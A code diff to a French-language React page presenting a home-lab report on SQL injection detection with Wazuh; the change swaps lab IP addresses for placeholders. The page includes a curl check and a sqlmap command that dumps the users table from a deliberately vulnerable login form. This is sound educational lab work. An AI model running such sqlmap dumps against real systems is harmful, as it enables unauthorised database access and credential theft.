@@ -20,8 +20,8 @@ export default function RapportInjectionSQL() {
       <Table
         head={['Rôle', 'Machine / Emplacement', 'Détail']}
         rows={[
-          ['Attaquant', 'VM Kali (VirtualBox)', '192.168.56.100'],
-          ['Cible (serveur web)', 'Hôte Windows 11 — XAMPP/Apache', 'http://192.168.56.1/lab-sqli/login.php'],
+          ['Attaquant', 'VM Kali (VirtualBox)', '[KALI]'],
+          ['Cible (serveur web)', 'Hôte Windows 11 — XAMPP/Apache', 'http://[HOTE]/lab-sqli/login.php'],
           ['Agent SIEM', 'Agent Wazuh 001 « Ushu » (l’hôte)', 'lit C:\\xampp\\apache\\logs\\access.log'],
           ['SIEM', 'Wazuh 4.12 (Docker dans WSL2 Ubuntu)', 'Tableau de bord : https://localhost'],
           ['Base de données', 'MySQL « tuto » (table users)', '3 comptes de test'],
@@ -40,8 +40,8 @@ export default function RapportInjectionSQL() {
 
       <H2>4. L&rsquo;attaque avec SQLMap</H2>
       <p>Vérifier d&rsquo;abord que la cible répond, puis extraire la table users :</p>
-      <Cmd term="Kali">{`curl -s -o /dev/null -w "%{http_code}\\n" "http://192.168.56.1/lab-sqli/login.php"
-sqlmap -u "http://192.168.56.1/lab-sqli/login.php?email=test&mdp=test" -p email --batch --dump -D tuto -T users`}</Cmd>
+      <Cmd term="Kali">{`curl -s -o /dev/null -w "%{http_code}\\n" "http://[HOTE]/lab-sqli/login.php"
+sqlmap -u "http://[HOTE]/lab-sqli/login.php?email=test&mdp=test" -p email --batch --dump -D tuto -T users`}</Cmd>
       <p>
         Résultat : SQLMap indique le paramètre <code className="font-mono text-accent text-sm">email</code> injectable,
         identifie MySQL, puis affiche la table users avec les 3 comptes et leurs
